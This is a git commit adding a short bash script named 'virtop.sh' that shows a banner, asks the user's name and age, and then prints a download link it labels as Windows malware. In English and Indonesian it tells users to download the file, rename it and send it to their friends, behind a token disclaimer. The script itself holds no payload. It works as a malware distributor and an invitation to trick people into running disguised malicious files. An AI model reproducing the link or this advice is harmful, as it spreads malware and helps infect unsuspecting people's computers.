e2ef5cacdeb055db58cd2b7fcbec6ab1ed5176a5
REDSEC <68374733+hjprihatini@users.noreply.github.com>
2022-06-19 11:02:14 +0700

    Add files via upload

---
+++ virtop.sh
@@ -0,0 +1,26 @@
+#!/bin/bash
+clear 
+figlet VirTop
+echo "Do not use these tools for criminals. Use these tools wisely.
+If something happens, the tool owner is not responsible, thank you"
+echo "[<=====================>]"
+echo "Name : RedSec"
+echo "team : MedanSec & L4E Team"
+echo "[<=====================>]"
+read -p "What Is Your Name => "
+read -p "How Old Are You => "
+echo 
+echo "Processing...."
+sleep 5
+echo "success"
+echo
+figlet Link
+echo "Link Malwer : https://gofile.io/d/QN6ve9"
+echo 
+echo "Ingglish : Download the malware first (don't be afraid).
+Then change the name of the malware to what you want and send it to your friends"
+echo
+echo "Indonesia : Downloas terlebih dahulu malwer nya ( gak usah takut ). 
+Lalu Ganti nama malwer sesuai yang kalian inginkan dan kirim ke temen kalian"
+echo
+echo "Malwer Windows/pc only (Malwer Khusus Windouse/pc)"
